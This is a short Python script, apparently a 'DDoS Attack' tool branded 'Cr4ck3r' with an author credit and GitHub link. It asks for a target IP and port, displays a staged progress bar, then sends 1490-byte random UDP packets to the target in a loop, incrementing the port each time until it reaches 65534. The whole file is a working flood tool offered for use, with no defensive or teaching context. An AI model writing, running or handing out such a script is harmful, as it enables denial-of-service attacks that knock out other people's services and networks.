import sys
import os
import time
import socket
import random
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("clear")
os.system("figlet Cr4ck3r")

print("Author ----> Muhammed, Peygamov")
print("Github ----> https://github.com/tqybtmyath")

print()
ip = input("IP Target : ")
port = int(input("Port: "))
os.system("clear")
print("\033[93m")
os.system("figlet DDoS Attack")
print("Team : Cr4ck3r")
print("\033[92m")
print("[                    ] 0% ")
time.sleep(5)
print("[=====               ] 25%")
time.sleep(5)
print("[==========          ] 50%")
time.sleep(5)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 100%")
time.sleep(3)
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    print(f"Sent {sent} packet to {ip} through port: {port}")
    if port == 65534:
        break  
    
